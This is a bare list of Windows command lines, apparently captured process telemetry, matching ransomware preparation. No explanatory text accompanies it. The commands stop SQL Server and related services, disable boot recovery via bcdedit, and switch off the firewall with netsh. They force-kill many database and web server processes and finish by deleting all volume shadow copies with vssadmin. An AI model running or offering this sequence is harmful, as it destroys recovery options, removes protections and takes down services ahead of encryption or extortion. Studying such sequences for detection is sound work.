 cmd.exe %WINDIR%\system32\cmd.exe /c net stop SQLWriter /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop SQLBrowser /y
 net.exe net stop SQLBrowser /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop MSSQLSERVER /y
 net.exe net stop MSSQLSERVER /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop MSSQL$CONTOSO1 /y
 net.exe net stop MSSQL$CONTOSO1 /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop MSDTC /y
 net.exe net stop MSDTC /y
 cmd.exe %WINDIR%\system32\cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
 cmd.exe %WINDIR%\system32\cmd.exe /c bcdedit /set {default} recoveryenabled no
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop SQLSERVERAGENT /y
 net.exe net stop SQLSERVERAGENT /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop MSSQLSERVER /y
 net.exe net stop MSSQLSERVER /y
 cmd.exe %WINDIR%\system32\cmd.exe /c net stop vds /y
 net.exe net stop vds /y
 cmd.exe %WINDIR%\system32\cmd.exe /c netsh advfirewall set currentprofile state off
 netsh.exe netsh advfirewall set currentprofile state off
 cmd.exe %WINDIR%\system32\cmd.exe /c netsh firewall set opmode mode=disable
 netsh.exe netsh firewall set opmode mode=disable

taskkill /f /im sqlservr.exe
taskkill /f /im msaccess.exe
taskkill /f /im sqlbrowser.exe
taskkill /f /im sqlceip.exe
taskkill /f /im fdhost.exe
taskkill /f /im postgres.exe
taskkill /f /im msmdsrv.exe
taskkill /f /im firebird.exe
taskkill /f /im sag.exe
taskkill /f /im fdlauncher.exe
taskkill /f /im oracle.exe
taskkill /f /im fbserver.exe
taskkill /f /im mysqld.exe
taskkill /f /im mysqld-nt.exe
taskkill /f /im scai.exe
taskkill /f /im saci.exe
taskkill /f /im mysqld.exe
taskkill /f /im w3wp.exe
taskkill /f /im sqlceip.exe
vssadmin delete shadows /all /Quiet